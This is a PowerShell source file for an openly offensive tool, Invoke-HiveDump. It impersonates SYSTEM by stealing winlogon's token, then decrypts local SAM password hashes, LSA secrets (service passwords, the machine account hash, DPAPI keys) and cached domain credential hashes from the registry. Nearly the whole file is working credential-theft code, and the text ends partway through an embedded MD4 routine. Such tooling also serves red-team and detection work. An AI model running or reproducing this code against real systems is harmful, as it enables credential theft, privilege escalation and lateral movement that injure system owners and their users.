Function Invoke-HiveDump {
<#
.SYNOPSIS
    Dump credentials from registry hives.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-HiveDump extracts password hashes of local accounts from SAM hive, LSA secrets and cached domain credentials from SECURITY hive.
    SAM parser is adapted from PowerDump by Kathy Peters, Josh Kelley (@winfang) and Dave Kennedy (@ReL1K), pulled from Empire project.
    SECURITY parser is adapted from AADInternals by @NestoriSyynimaa.

.EXAMPLE
    PS C:\> Invoke-HiveDump
#>
    [CmdletBinding()]
    Param ()

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "This command must be launched as an Administrator" 
        return
    }

    Invoke-AsSystem -ScriptBlock { Invoke-SAMDump }
    Invoke-AsSystem -ScriptBlock { Invoke-LSADump }
}

Function Local:Invoke-AsSystem {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [scriptblock]
        $ScriptBlock,

        [Parameter(Position=1)]
        [object[]]
        $ArgumentList
    )

    $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id
    if (($processHandle = [HiveDump.Native]::OpenProcess(0x400, $true, [Int32]$winlogonPid)) -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [HiveDump.Native]::OpenProcessToken($processHandle, 0x0E, [ref]$tokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [HiveDump.Native]::DuplicateTokenEx($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    try {
        if (-not [HiveDump.Native]::ImpersonateLoggedOnUser($dupTokenHandle)) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }
        & $ScriptBlock @ArgumentList
    }
    finally {
        if (-not [HiveDump.Native]::RevertToSelf()) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }
    }
}

Function Local:Get-BootKey {
    BEGIN {
        Function Get-RegKeyClass([string]$key, [string]$subkey) {
            switch ($Key) {
                "HKCR" { $nKey = 0x80000000} #HK Classes Root
                "HKCU" { $nKey = 0x80000001} #HK Current User
                "HKLM" { $nKey = 0x80000002} #HK Local Machine
                "HKU"  { $nKey = 0x80000003} #HK Users
                "HKCC" { $nKey = 0x80000005} #HK Current Config
                default {
                    throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                }
            }
            $KEYQUERYVALUE = 0x1
            $KEYREAD = 0x19
            $KEYALLACCESS = 0x3F
            $result = ""
            [int]$hkey = 0
            if (-not [HiveDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)) {
                $classVal = New-Object Text.Stringbuilder 1024
                [int]$len = 1024
                if (-not [HiveDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
                    [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)) {
                    $result = $classVal.ToString()
                }
                else {
                    Write-Error "RegQueryInfoKey failed"
                }
                [HiveDump.Native]::RegCloseKey($hkey) | Out-Null
            }
            else {
                Write-Error "Cannot open key"
            }
            return $result
        }
    }

    PROCESS {
        $s = [string]::Join("", $("JD","Skew1","GBG","Data" | % {Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
        $b = New-Object Byte[] $($s.Length/2)
        0..$($b.Length-1) | % {$b[$_] = [Convert]::ToByte($s.Substring($($_*2), 2), 16)}
        $b2 = New-Object Byte[] 16
        0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -BEGIN {$i=0} {$b2[$i]=$b[$_]; $i++}
        return ,$b2
    }
}

Function Local:Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

Function Local:Decrypt-String([byte[]] $key, [byte[]] $encryptedData, [byte[]] $IV) {
    $aesManaged = Create-AesManagedObject $key $IV

    # Add padding if needed
    $tailLength = $encryptedData.Length % 16
    if ($tailLength -ne 0) {
        $manualPadding = New-Object Collections.Generic.List[byte]
        for ($i = 16 - $tailLength; $i -gt 0; $i--) {
            $manualPadding.Add(0x00)
        }
        [byte[]] $concat = New-Object byte[] $($encryptedData.Length + $manualPadding.Count)
        [Buffer]::BlockCopy($encryptedData, 0, $concat, 0, $encryptedData.Length)
        [Buffer]::BlockCopy($manualPadding.ToArray(), 0, $concat, $encryptedData.Length, $manualPadding.Count)
        $encryptedData = $concat
    }

    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
    $aesManaged.Dispose()
    $unencryptedData
}

Function Invoke-SAMDump {
    Function Local:sid_to_key($sid) {
        $s1 = @()
        $s1 += [char]($sid -band 0xFF)
        $s1 += [char]([HiveDump.Shift]::Right($sid,8) -band 0xFF)
        $s1 += [char]([HiveDump.Shift]::Right($sid,16) -band 0xFF)
        $s1 += [char]([HiveDump.Shift]::Right($sid,24) -band 0xFF)
        $s1 += $s1[0]
        $s1 += $s1[1]
        $s1 += $s1[2]
        $s2 = @()
        $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2]
        $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2]
        return ,((str_to_key $s1),(str_to_key $s2))
    }

    Function Local:str_to_key($s) {
        $odd_parity = @(
            1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
            16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
            32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
            49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
            64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
            81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
            97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
            112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
            128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
            145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
            161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
            176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
            193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
            208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
            224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
            241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        )

        $key = @()
        $key += [HiveDump.Shift]::Right([int]($s[0]), 1 )
        $key += [HiveDump.Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [HiveDump.Shift]::Right([int]($s[1]),2)
        $key += [HiveDump.Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [HiveDump.Shift]::Right([int]($s[2]),3)
        $key += [HiveDump.Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [HiveDump.Shift]::Right([int]($s[3]),4)
        $key += [HiveDump.Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [HiveDump.Shift]::Right([int]($s[4]),5)
        $key += [HiveDump.Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [HiveDump.Shift]::Right([int]($s[5]),6)
        $key += [HiveDump.Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [HiveDump.Shift]::Right([int]($s[6]),7)
        $key += $([int]($s[6]) -band 0x7F)
        0..7 | % {
            $key[$_] = [HiveDump.Shift]::Left($key[$_], 1)
            $key[$_] = $odd_parity[$key[$_]]
        }
        return ,$key
    }

    Function Local:NewRC4([byte[]]$key) {
        return new-object Object |
        Add-Member NoteProperty key $key -PassThru |
        Add-Member NoteProperty S $null -PassThru |
        Add-Member ScriptMethod init {
            if (-not $this.S) {
                [byte[]]$this.S = 0..255
                0..255 | % -BEGIN {[long]$j=0} {
                    $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length
                    $temp = $this.S[$_]
                    $this.S[$_] = $this.S[$j]
                    $this.S[$j] = $temp
                }
            }
        } -PassThru |
        Add-Member ScriptMethod "encrypt" {
            $data = $args[0]
            $this.init()
            $outbuf = new-object byte[] $($data.Length)
            $S2 = $this.S[0..$this.S.Length]
            0..$($data.Length-1) | % -BEGIN{$i=0; $j=0} {
                $i = ($i+1) % $S2.Length
                $j = ($j + $S2[$i]) % $S2.Length
                $temp = $S2[$i]
                $S2[$i] = $S2[$j]
                $S2[$j] = $temp
                $a = $data[$_]
                $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ]
                $outbuf[$_] = ($a -bxor $b)
            }
            return ,$outbuf
        } -PassThru
    }

    Function Local:des_encrypt([byte[]]$data, [byte[]]$key) {
        return ,(des_transform $data $key $true)
    }

    Function Local:des_decrypt([byte[]]$data, [byte[]]$key) {
        return ,(des_transform $data $key $false)
    }

    Function Local:des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) {
        $des = new-object Security.Cryptography.DESCryptoServiceProvider
        $des.Mode = [Security.Cryptography.CipherMode]::ECB
        $des.Padding = [Security.Cryptography.PaddingMode]::None
        $des.Key = $key
        $des.IV = $key
        $transform = $null
        if ($doEncrypt) {$transform = $des.CreateEncryptor()}
        else {$transform = $des.CreateDecryptor()}
        $result = $transform.TransformFinalBlock($data, 0, $data.Length)
        return ,$result
    }

    Function Local:RC4_Get-HBootKey {
        param([byte[]]$bootkey)
        $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
        $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
        $k = Get-Item HKLM:\SAM\SAM\Domains\Account
        if (-not $k) {return $null}
        [byte[]]$F = $k.GetValue("F")
        if (-not $F) {return $null}
        $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum)
        $rc4 = NewRC4 $rc4key
        return ,($rc4.encrypt($F[0x80..0xA0]))
    }

    Function Local:RC4_DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) {
        $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
        $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0")

        # LM Hash
        if ($enc_lm_hash.Length -lt 20) {
            $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
        }
        else {
            $lmhash = RC4_DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword
        }

        # NT Hash
        if ($enc_nt_hash.Length -lt 20) {
            $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
        }
        else {
            $nthash = RC4_DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword
        }
        return ,($lmhash,$nthash)
    }

    Function Local:RC4_DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr) {
        $deskeys = sid_to_key $rid
        $md5 = [Security.Cryptography.MD5]::Create()
        $rc4_key = $md5.ComputeHash($hbootkey[0x00..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
        $rc4 = NewRC4 $rc4_key
        $obfkey = $rc4.encrypt($enc_hash[0x04..$(0x04+0x0f)])
        $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
            (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1])
        return ,$hash
    }

    Function Local:Get-HBootKey {
        Param ([byte[]]$bootkey)
        $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
        $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
        $k = Get-Item HKLM:\SAM\SAM\Domains\Account
        if (-not $k) {
            return $null
        }
        [byte[]]$F = $k.GetValue("F")
        if (-not $F) {
            return $null
        }

        # offset 0x88 from 'F' (16 bytes)
        $data = $F[$(0x88)..$(0x88+0x0f)]

        # offset 0x78 from 'F' (16 bytes)
        $iv = $F[$(0x78)..$(0x78+0x0f)]
        $key = $bootkey
        $unencryptedData = Decrypt-String -key $key -encryptedData $data -IV $iv
        return ,$unencryptedData
    }

    Function Local:Get-UserName([byte[]]$V) {
        if (-not $V) {return $null}
        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC
        $len = [BitConverter]::ToInt32($V[0x10..0x13],0)
        return [Text.Encoding]::Unicode.GetString($V, $offset, $len)
    }

    Function Local:Get-UserHashes($u, [byte[]] $hbootkey) {
        $empty_lm = [byte[]] @(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
        $empty_nt = [byte[]] @(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0)
        [byte[]] $enc_lm_hash = $null
        [byte[]] $enc_nt_hash = $null

        if ($u -ne $null) {
            $enc_nt_hash = $u.V[$($u.nt_HashOffset)..$($u.nt_HashOffset+$u.nt_len)]
            $enc_lm_hash = $u.V[$($u.lm_HashOffset)..$($u.lm_HashOffset+$u.lm_len)]
            # If hash length = 0x38 then compute AES Hash
            if ($u.nt_len -eq 0x38) {
                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey)
            }
            # If hash length = 0x14 then compute RC4 Hash
            elseif ($u.nt_len -eq 0x14) {
                $hbootkey = RC4_Get-HBootKey
                return ,(RC4_DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey)
            }
            else {
                return ($empty_lm, $empty_nt)
            }
        }
        else {
            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey)
        }
    }

    Function Local:DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) {
        # LM Hash
        if ($enc_lm_hash.Length -lt 40) {
            $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
        }
        else {
            $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash
        }

        # NT Hash
        if ($enc_nt_hash.Length -lt 40) {
            $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
        }
        else {
            $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash
        }
        return ,($lmhash, $nthash)
    }

    Function Local:DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash) {
        $deskeys = sid_to_key $rid
        $key = $hbootkey[0x00..0x0f]
        $iv = $enc_hash[0x08..$(0x08+0x0f)]
        $data = $enc_hash[0x18..$(0x18+0x0f)]
        $obfkey = Decrypt-String -key $key -encryptedData $data -IV $iv
        $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1])
        return ,$hash

    }

    Function Local:Get-UserKeys {
        Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users |
            where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
                Add-Member AliasProperty KeyName PSChildName -PassThru |
                Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
                Add-Member ScriptProperty lm_HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru |
                Add-Member ScriptProperty lm_len {[BitConverter]::ToUInt32($this.GetValue("V")[0xa0..0xa3],0)} -PassThru |
                Add-Member ScriptProperty nt_HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0xa8..0xab],0) + 0xCC} -PassThru |
                Add-Member ScriptProperty nt_len {[BitConverter]::ToUInt32($this.GetValue("V")[0xac..0xaf],0)} -PassThru
    }

    Write-Host "[*] SAM hashes"
    $bootkey = Get-BootKey
    $hbootKey = Get-HBootKey $bootkey
    $hashes = Get-UserHashes $_ $hBootKey
    Get-UserKeys | % {
        $hashes = Get-UserHashes $_ $hBootKey
        Write-Output ("{0}:{1}:{2}:{3}" -f (
            $_.UserName, 
            $_.Rid, 
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), 
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower()
        ))
    }
}

Function Invoke-LSADump {
    Param ()

    BEGIN {
        Function Local:Decrypt-LSASecretData {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [byte[]]$Data,

                [Parameter(Mandatory=$True)]
                [byte[]]$Key,

                [Parameter(Mandatory=$True)]
                [byte[]]$InitialVector
            )

            PROCESS {
                # Create a SHA256 object 
                $sha256 = [Security.Cryptography.SHA256]::Create()

                # Derive the encryption key (first hash with the key, and then 1000 times with IV)
                $sha256.TransformBlock($Key,0,$Key.Length,$null,0) | Out-Null
                for ($a = 0; $a -lt 999; $a++) {
                    $sha256.TransformBlock($InitialVector,0,$InitialVector.Length,$null,0) | Out-Null
                }
                $sha256.TransformFinalBlock($InitialVector,0,$InitialVector.Length) | Out-Null
                $encryptionKey = $sha256.Hash

                # Create an AES decryptor
                $aes=New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
                $aes.Mode="ECB"
                $aes.Padding="None"
                $aes.KeySize = 256
                $aes.Key = $encryptionKey
                
                # Decrypt the data
                $dec = $aes.CreateDecryptor()
                $decryptedData = $dec.TransformFinalBlock($Data,0,$Data.Count)

                return $decryptedData
            }
        }

        Function Local:Parse-LSASecretBlob {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [byte[]]$Data
            )

            $version =   [BitConverter]::ToInt32($Data[3..0], 0)
            $guid =      [guid][byte[]]($Data[4..19])
            $algorithm = [BitConverter]::ToInt32($Data, 20)
            $flags =     [BitConverter]::ToInt32($Data, 24)
            $lazyIv =    $Data[28..59]

            New-Object -TypeName PSObject -Property @{
                "Version" =   $version
                "GUID" =      $guid
                "Algorighm" = $algorithm
                "Flags" =     $flags
                "IV" =        $lazyIv
                "Data" =      $Data[60..$($Data.Length)]
            }
        }

        Function Local:Parse-LSAPasswordBlob {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [byte[]]$PasswordBlob
            )

            # Get the size
            $BlobSize = [BitConverter]::ToInt32($PasswordBlob, 0)
            
            # Get the actual data (strip the first four DWORDs)
            $Blob = $PasswordBlob[16..$(16+$BlobSize-1)]

            return $Blob
        }

        Function Local:Parse-LSAKeyStream {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [byte[]]$KeyStream
            )

            # Get the stream size
            $streamSize = [BitConverter]::ToInt32($KeyStream,0)
            
            # Get the actual data (strip the first four DWORDs)
            $streamData = $KeyStream[16..$(16+$streamSize-1)]

            # Parse the keystream metadata
            $ksType = [BitConverter]::ToInt32($streamData[0..3], 0)
            #$currentKeyID = [guid][byte[]]($streamData[4..19])
            $ksType2 = [BitConverter]::ToInt32($streamData, 20)
            $ksNumKeys = [BitConverter]::ToInt32($streamData, 24)

            # Loop through the list of the keys, start right after the header information
            $pos = 28
            $keys = @{}
            for ($a = 0; $a -lt $ksNumKeys; $a++) {
                $keyId = [guid][byte[]]($streamData[$pos..$($pos+15)])
                $pos += 16

                $keyType = [BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
                $pos += 4

                $keySize = [BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
                $pos += 4

                $keyBytes = [byte[]]($streamData[$pos..$($pos+$keySize-1)])
                $pos += $keySize

                $keys[$keyId.ToString()] = $keyBytes
            }
            return $keys
        }

        Function Local:Pad([int] $data) {
            if (($data -band 0x3) -gt 0) {
                return ($data + ($data -band 0x3))
            }
            else {
                return $data
            }
        }

        Function Local:IsZeroes([Byte[]] $inputArray) {
            foreach ($b in $inputArray) {
                if ($b -ne 0x00) {
                    return $false
                }
            }
            return $true
        }
    }

    PROCESS {
        Write-Host "[*] LSA Secrets"

        # Get the syskey a.k.a. bootkey
        $syskey = Get-Bootkey

        # Get the encryption key Blob
        $encKeyBlob = Parse-LSASecretBlob -Data (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")
        
        # Decrypt the encryption key Blob using the syskey
        $decKeyBlob = Decrypt-LSASecretData -Data ($encKeyBlob.Data) -Key $syskey -InitialVector ($encKeyBlob.IV)

        # Parse the keys
        $encKeys = Parse-LSAKeyStream -KeyStream $decKeyBlob

        # Get the password Blobs for each system account
        $users = Get-ChildItem "HKLM:\SECURITY\Policy\Secrets\" | select -ExpandProperty PSChildName
        foreach ($user in $users) {
            $regKey = "HKLM:\SECURITY\Policy\Secrets\$user\CurrVal"
            $nlkmKey = $null
            if (Test-Path $regKey) {
                # Get the secret Blob from registry
                $pwdBlob = Parse-LSASecretBlob -Data (Get-ItemPropertyValue $regKey -Name "(default)")

                # Decrypt the password Blob using the correct encryption key
                $decPwdBlob = Decrypt-LSASecretData -Data ($pwdBlob.Data) -Key $encKeys[$($pwdBlob.GUID.ToString())] -InitialVector ($pwdBlob.IV)

                # Parse the Blob
                $pwdb = Parse-LSAPasswordBlob -PasswordBlob $decPwdBlob
                if ($pwdb.Length -le 2) {
                    continue
                }

                Write-Host "[*] $user"
                if ($user.ToUpper().StartsWith('_SC_')) {
                    $startname = (Get-ItemProperty "HKLM:\SYSTEM\ControlSet001\Services\$($user.Substring(4))" -Name ObjectName).ObjectName
                    Write-Output ($startName + ':' + [Text.Encoding]::Unicode.GetString($pwdb))
                }
                elseif ($user.ToUpper().StartsWith('$MACHINE.ACC')) {
                    $md4 = [HiveDump.Crypto]::Md4Hash2($pwdb)
                    $computerAcctHash = [BitConverter]::ToString($md4).Replace("-", "").ToLower()
                    $domainName = (Get-ItemProperty "HKLM:\SYSTEM\ControlSet001\Services\Tcpip\Parameters" -Name Domain).Domain
                    $computerName = (Get-ItemProperty "HKLM:\SYSTEM\ControlSet001\Services\Tcpip\Parameters" -Name Hostname).Hostname
                    Write-Output ('{0}\{1}$:{2}:{3}' -f ($domainName, $computerName, 'aad3b435b51404eeaad3b435b51404ee', $computerAcctHash))
                }
                elseif ($user.ToUpper().StartsWith('DPAPI')) {
                    Write-Output ('dpapi_machinekey:' + [BitConverter]::ToString($pwdb[4..23]).Replace("-", "").ToLower())
                    Write-Output ('dpapi_userkey:' + [BitConverter]::ToString($pwdb[24..43]).Replace("-", "").ToLower())
                }
                elseif ($user.ToUpper().StartsWith('NL$KM')) {
                    Write-Output ('NL$KM:' + [BitConverter]::ToString($pwdb).Replace("-", "").ToLower())
                    $nlkmKey = $decPwdBlob
                }
                elseif ($user.ToUpper().StartsWith('ASPNET_WP_PASSWORD')) {
                    Write-Output ('ASPNET:' + [Text.Encoding]::Unicode.GetString($pwdb))
                }
                else {
                    # [!] Secret type not supported yet - outputing raw secret as unicode
                    Write-Output (([Text.Encoding]::Unicode.GetString($pwdb)).TrimEnd(@(0x00,0x0a,0x0d)))
                }
            }
            else {
                Write-Error "No secrets found for user $user"
            }
        }

        if ($nlkmKey) {
            Write-Host "[*] Cached domain logon information (domain/username:hash)"
            $cachedLogins = Get-ItemProperty "HKLM:\SECURITY\Cache"
            foreach ($cachedLogin in $cachedLogins.PsObject.Properties) {
                $cacheData = $cachedLogin.Value
                if ((-not (($cachedLogin.Name).ToUpper().StartsWith('NL$CONTROL'))) -and (-not (IsZeroes($cacheData[0..15]))) -and ($cacheData.Length -gt 96)) {
                    $key = $nlkmKey[16..31]
                    $encryptedData = $cacheData[96..$($cacheData.Length-1)]
                    $iv = $cacheData[64..79]
                    $plaintext = Decrypt-String -key $key -encryptedData $encryptedData -IV $iv
                    $hashedPW = $plaintext[0..15]
                    $userLength = [BitConverter]::ToInt16($cacheData[0..1], 0)
                    $username = [Text.Encoding]::Unicode.GetString($plaintext[72..$($userLength + 71)])
                    $domainNameLength = [BitConverter]::ToInt16($cacheData[2..3], 0)
                    $dnsDomainLength = [BitConverter]::ToInt16($cacheData[60..61], 0)
                    $offset = 72 + (Pad($userLength)) + (Pad($domainNameLength))
                    $domain = [Text.Encoding]::Unicode.GetString($plaintext[$offset..$(Pad($offset + $dnsDomainLength - 1))])
                    $domain = $domain.Trim([char] 0)
                    Write-Output ("{0}/{1}:`$DCC2`$10240#{2}#{3}" -f (
                        $domain, 
                        $username, 
                        $username, 
                        [BitConverter]::ToString($hashedPW).Replace("-","").ToLower()
                    ))
                }
            }
        }
    }
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

using System.Collections.Generic;
using System.Linq;

namespace HiveDump {
    public class Native {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern int RegOpenKeyEx(
            IntPtr hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            out IntPtr hkResult);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern int RegQueryInfoKey(
            IntPtr hkey,
            StringBuilder lpClass,
            ref int lpcbClass,
            int lpReserved,
            out int lpcSubKeys,
            out int lpcbMaxSubKeyLen,
            out int lpcbMaxClassLen,
            out int lpcValues,
            out int lpcbMaxValueNameLen,
            out int lpcbMaxValueLen,
            out int lpcbSecurityDescriptor,
            IntPtr lpftLastWriteTime);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern int RegCloseKey(
            IntPtr hKey);
    }

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }

    public static class Crypto {
        //https://rosettacode.org/wiki/MD4
        public static byte[] Md4Hash2(this byte[] input) {
            // get padded uints from bytes
            List<byte> bytes = input.ToList();
            uint bitCount = (uint)(bytes.Count) * 8;
            bytes.Add(128);
            while (bytes.Count % 64 != 56) bytes.Add(0);
            var uints = new List<uint>();
            for (int i = 0; i + 3 < bytes.Count; i += 4)
                uints.Add(bytes[i] | (uint)bytes[i + 1] << 8 | (uint)bytes[i + 2] << 16 | (uint)bytes[i + 3] << 24);
            uints.Add(bitCount);
            uints.Add(0);
            // run rounds
            uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
            Func<uint, uint, uint> rol = (x, y) => x << (int)y | x >> 32 - (int)y;
            for (int q = 0; q + 15 < uints.Count; q += 16) {
                var chunk = uints.GetRange(q, 16);
                uint aa = a, bb = b, cc = c, dd = d;
                Action<Func<uint, uint, uint, uint>, uint[]> round = (f, y) => {
                    foreach (uint i in new[] { y[0], y[1], y[2], y[3] }) {
